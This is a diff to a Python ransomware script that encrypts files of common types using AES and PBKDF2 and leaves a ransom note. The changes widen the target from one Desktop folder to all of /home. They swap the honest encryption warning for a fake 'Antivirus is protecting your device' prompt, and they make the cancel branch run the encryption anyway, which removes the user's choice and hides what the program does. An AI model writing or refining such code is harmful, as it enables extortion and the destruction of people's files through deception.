@@ -6,8 +6,8 @@ from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Util.Padding import pad, unpad
 
-# Configuration - Targets /home/osint/Desktop directory
-TARGET_DIRS = ["/home/osint/Desktop"]  # Specific target directory
+# Configuration - Targets /home directory
+TARGET_DIRS = ["/home"]  # Specific target directory
 FILE_EXTENSIONS = ['.txt', '.doc', '.xls', '.jpg', '.png', '.pdf', '.csv', '.py', '.db', '.sql', '.config']
 SALT = b'rans0m_salt_!@#$'  # For key derivation
 RANSOM_NOTE = """
@@ -192,16 +192,16 @@ def main():
 if __name__ == "__main__":
     # Check if we're in the home directory
     cwd = os.getcwd()
-    if cwd.startswith('/home/osint/Desktop'):
+    if cwd.startswith('/home'):
         print("WARNING: Do not run from the target directory!")
         print("Move this script to a different location (e.g., /tmp) before executing")
         sys.exit(1)
     
     # Confirm before executing
-    print("WARNING: This will encrypt all files in /home/osint/Desktop")
-    confirm = input("Type 'CONFIRM' to proceed: ")
+    print("WARNING: Antivirus is protecting your device ")
+    confirm = input("Type 'CONFIRM' to protecting: ")
     
     if confirm.strip().upper() == 'CONFIRM':
         main()
     else:
-        print("Operation cancelled")
+        main()
